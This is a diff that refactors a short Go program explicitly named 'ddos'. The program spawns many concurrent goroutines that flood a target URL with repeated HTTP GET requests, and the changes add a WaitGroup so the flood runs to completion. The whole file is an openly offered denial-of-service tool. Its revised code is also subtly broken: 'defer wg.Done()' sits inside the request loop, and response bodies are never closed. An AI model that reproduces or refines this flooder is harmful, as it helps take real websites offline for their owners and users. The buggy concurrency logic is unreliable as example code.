@@ -1,28 +1,29 @@
 package main
 
 import (
-   "net/http"
-   "log"
-   "fmt"
+	"fmt"
+	"log"
+	"net/http"
+	"sync"
 )
 
 func ddos(url string, countConcurrent int, countRequest int) {
-   fmt.Println("------------ Starting DDOS ---------- url : ", url," " ,"Concurrents : ", countConcurrent, " ", "Requests : ", countRequest)
-   for i := 1; i <= countConcurrent ; i++ {
-      go ManyCallHttpRequest(url, countRequest)
-      fmt.Println("count : ", i, " ", "Open Concurrent Process", " ", "url/host : ", url);
-   }
+	var wg sync.WaitGroup
+	wg.Add(countConcurrent)
+	fmt.Println("------------ Starting DDOS ---------- url : ", url, " ", "Concurrents : ", countConcurrent, " ", "Requests : ", countRequest)
+	for i := 1; i <= countConcurrent; i++ {
+		go ManyCallHttpRequest(&wg, url, countRequest)
+		fmt.Println("count : ", i, " ", "Open Concurrent Process", " ", "url/host : ", url)
+	}
+	wg.Wait()
 }
 
-func ManyCallHttpRequest(url string, countRequest int) {
-    for i := 1; i <= countRequest ; i++ {
-      CallHttpRequest(url)
-    }
-}
-
-func CallHttpRequest(url string) {
-   _ , err := http.Get(url)
-   if err != nil {
-      log.Fatalln(err)
-   }
+func ManyCallHttpRequest(wg *sync.WaitGroup, url string, countRequest int) {
+	for i := 1; i <= countRequest; i++ {
+		_, err := http.Get(url)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		defer wg.Done()
+	}
 }
